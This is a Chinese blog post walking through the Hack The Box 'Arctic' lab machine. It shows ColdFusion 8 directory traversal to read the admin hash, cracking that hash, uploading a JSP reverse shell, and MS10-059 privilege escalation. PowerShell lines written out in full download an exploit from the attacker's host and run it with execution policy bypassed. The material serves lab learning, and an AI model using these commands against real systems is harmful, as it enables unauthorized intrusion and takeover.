> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/aI3eI6UpreVZdhXvsFXzJQ)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **59** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/2ichQqW6XvPlgohk6kjVu8GYOQ2Oco557j1bibkVCOsbLrO28pO7Lws1oVXcvS90GtYFe9Va2cepbqXjuziaDrnibg/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/9

靶机难度：容易（2.5/10）

靶机发布日期：2017 年 10 月 16 日

靶机描述：

Arctic is fairly straightforward, however the load times on the web server pose a few challenges for exploitation. Basic troubleshooting is required to get the correct exploit functioning properly.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/70aCp38I3nX6dfnC3RPrQfDeuwyvRCkVZ5NrvqgrPsUd76ALjnYzdoWubzsdbaGpIBU9LdWWaN6eK2jaDkibicFA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaicHUKVLMp2vK1qtPdpGSbdiaMSAhshIKEfHM67EItzicnqSabTlmLh8MLGU5PVy3Lyc3cIPJE0Kjnw/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1RVNBhE6c0icDItsqh0RiaXqNZCt7NZt2Htia2puiaOFb6Mc4tP310CwFIA/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.11，windows 系统的靶机..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1YJ8QKxGv0zWVvh2kNO5nsZBYcf8AiaAca7fXKfwFOxjeZszicYaQCYFA/640?wx_fmt=png)

nmap 发现开放了三个端口，8500 端口，可以在网上查到这是 ColdFusion Web 服务器...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY14ng1TycX9gyVdJU74aYMcL02oJyvFXibKqcvNYVRzFia2Jzhayy51P2Q/640?wx_fmt=png)

访问发现三个目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1fevtzVwFHnibS7fWeg9NUfqml4jkB1ePAX0PfB0E6CaqT2fMoiaAdN2g/640?wx_fmt=png)

我一个一个点进去，在 CFIDE 目录下存在 administrator 点开发现是个登陆页面...

果然是存在 ColdFusion Web 服务器的...ColdFusion 8...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1ctzq7XXI6TDlcLHLomt8REc4283dCpBTtwic2BYYTsKERObh0Uic1JMA/640?wx_fmt=png)

直接谷歌搜索 ColdFusion 8 EXP...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1ZmZXDaVZaJzzOHia21XeHybiaTfL7M5e1ta0MPVGfQibllHTozsH4yJQw/640?wx_fmt=png)

发现存在目录遍历的漏洞...

ColdFusion 8 还将管理员哈希值本地存储在名为 password.properties 的文件中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1e3znXDMZlIKP5a93icM8pw8yESic0hibZglEHGl2Ua1bAk8czgHMv972A/640?wx_fmt=png)

可以看到存在哈希值：

```
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1wwt2JhdeUhdqw3ah1n4RZnZiaaVGbFIWxE5oGuH3MYc2eY1PicjFL57g/640?wx_fmt=png)

```
https://crackstation.net/
在页面破解哈希值：happyday
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1wwt2JhdeUhdqw3ah1n4RZnZiaaVGbFIWxE5oGuH3MYc2eY1PicjFL57g/640?wx_fmt=png)

成功登陆...

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaicHUKVLMp2vK1qtPdpGSbdiaMSAhshIKEfHM67EItzicnqSabTlmLh8MLGU5PVy3Lyc3cIPJE0Kjnw/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1y5PeicuN7YflviaDApn4mtricu7RibMkrxrKyhKG9YbW7gic40LQUOWWKuQ/640?wx_fmt=png)

找到可以上传反向 shell 地方...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1icfcaIN5o7NBlT8IjEdRauSTIzibw73aVmuWhEoMdpHKqp5cwd4LK5qQ/640?wx_fmt=png)

服务器对本地 kali 进行 80 端口下载 jsp 反向 shell.... 需要保存在 C:\ColdFusion8\wwwroot\CFIDE\dayushell.jsp 目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1vnWCPjusQVNFCLoa29gzOY3FRb8CTYPibfBzTE0eaWWBDXky7WryISw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1eqtzQc9zH2q8uqvO88L1YmCO6rLn8ocbskxs3bd57icArrrDE2tFibOw/640?wx_fmt=png)

上传成功....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY11JQ3k4wicjia7l0MrK623QKG6iapN6wK86enKHWYE1bkqnDwnQJjWXkZQ/640?wx_fmt=png)

成功获得反向外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY11tb4L1PgqNFcFGKIW5ByhFKw2AqbiaWgULbu2EaoAvCOOAsLiadsXwtA/640?wx_fmt=png)

又是一个什么补丁都没打的原生系统...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1EdJyggjHJt8V4vvvPhbz0HWN9ia3lDksXLwZeRK8o7fVclp81rZGoxA/640?wx_fmt=png)

先拿到 user.txt，继续进行下一步... 寻找 root

谷歌搜索    发现 MS10-059 可利用，但是没编译成 EXE 文件，在 github 上找到了 Chimichurri.exe.... 编译好的

```
[链接](https://github.com/Re4son/Chimichurri/blob/master/Chimichurri.exe)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY16bPxFbY1iaxA8XUgibhxbeeiaWzopl4GCucVhmMdOAibqhMMkxf9FfAdKg/640?wx_fmt=png)

```
php
echo $webclient = New-Object System.Net.WebClient >>dayushell.ps1
echo $url = "http://10.10.14.16/Chimichurri.exe" >>dayushell.ps1
echo $file = "exploit.exe" >>dayushell.ps1
echo $webclient.DownloadFile($url,$file) >>dayushell.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File dayushell.ps1
```

首先得开启 80 服务，然后本地得存在 Chimichurri.exe 文件，然后利用 powershell.exe 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1qTRWclEjmAIA34Y2XRLcsHXerref7Jvg9podEBLr4pUM0o281cLehw/640?wx_fmt=png)

成功获得 system 权限...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMduqjFCfvVbjz7dRQgQKY1A6Xp8VP4j7MalsuqQhWKno0rzGzMOOFUgo1ibribcEskuyNgpgRsmlpA/640?wx_fmt=png)

成功获得 user.txt 和 root.txt.... 这里我介绍的方法是没利用 Metasploit 内核提权的....

针对别的漏洞，这里还可以利用

```
[MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)，[MS11-046](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046)
```

![](https://mmbiz.qpic.cn/mmbiz_png/2ichQqW6XvPlgohk6kjVu8GYOQ2Oco557j1bibkVCOsbLrO28pO7Lws1oVXcvS90GtYFe9Va2cepbqXjuziaDrnibg/640?wx_fmt=png)

当然如果利用 Metasploit 提权这台机子，几分钟就能获得 root.txt 了... 方法和我在 NO.55 中利用 suggester 去漏扫，发现可利用漏洞，然后生成 EXE 或者利用本地的，提权即可...

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/70aCp38I3nX6dfnC3RPrQfDeuwyvRCkVZ5NrvqgrPsUd76ALjnYzdoWubzsdbaGpIBU9LdWWaN6eK2jaDkibicFA/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

**2021.6.9~2021.6.16 号开启收徒模式，实战教学，有想法的私聊！**  

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)